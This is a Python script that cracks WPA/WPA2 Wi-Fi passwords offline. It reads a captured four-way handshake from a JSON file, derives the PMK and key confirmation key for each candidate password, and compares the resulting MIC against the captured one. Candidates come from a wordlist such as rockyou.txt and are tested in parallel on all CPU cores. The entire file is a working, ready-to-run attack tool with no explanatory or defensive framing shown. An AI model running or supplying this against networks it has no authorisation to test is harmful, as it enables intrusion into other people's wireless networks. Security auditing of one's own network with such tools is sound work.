import hashlib, hmac, json, binascii, multiprocessing as mp, time, sys

hs = json.load(open('hs.json'))
SSID = hs['ssid'].encode()
ap = bytes(int(x,16) for x in hs['ap'].split(':'))
cl = bytes(int(x,16) for x in hs['client'].split(':'))
anonce = binascii.unhexlify(hs['anonce'])
snonce = binascii.unhexlify(hs['snonce'])
target_mic = binascii.unhexlify(hs['mic'])
eapol2 = bytearray(binascii.unhexlify(hs['eapol2'])); eapol2[81:97] = b'\x00'*16; eapol2 = bytes(eapol2)
A = b"Pairwise key expansion"
B = min(ap, cl) + max(ap, cl) + min(anonce, snonce) + max(anonce, snonce)

def check(pw):
    pmk = hashlib.pbkdf2_hmac('sha1', pw, SSID, 4096, 32)
    r = b''
    for i in range(4):
        r += hmac.new(pmk, A + b'\x00' + B + bytes([i]), hashlib.sha1).digest()
    kck = r[:16]
    return hmac.new(kck, eapol2, hashlib.sha1).digest()[:16] == target_mic

def worker(chunk):
    for pw in chunk:
        if check(pw):
            return pw
    return None

def gen(path, bs=2000):
    buf = []
    with open(path, 'rb') as f:
        for line in f:
            pw = line.rstrip(b'\r\n')
            if 8 <= len(pw) <= 63:
                buf.append(pw)
                if len(buf) >= bs:
                    yield buf; buf = []
    if buf: yield buf

if __name__ == '__main__':
    path = sys.argv[1] if len(sys.argv) > 1 else 'rockyou.txt'
    ncpu = mp.cpu_count()
    print('cores', ncpu, 'wordlist', path, flush=True)
    t0 = time.time(); done = 0
    with mp.Pool(ncpu) as pool:
        for res in pool.imap(worker, gen(path), chunksize=1):
            done += 2000
            if res is not None:
                print('\n*** FOUND PASSWORD:', res.decode('latin-1'), flush=True)
                pool.terminate(); sys.exit(0)
            if done % 40000 == 0:
                el = time.time()-t0
                print(f'  tried ~{done} in {el:.0f}s ({done/el:.0f}/s)', flush=True)
    print('exhausted', flush=True)
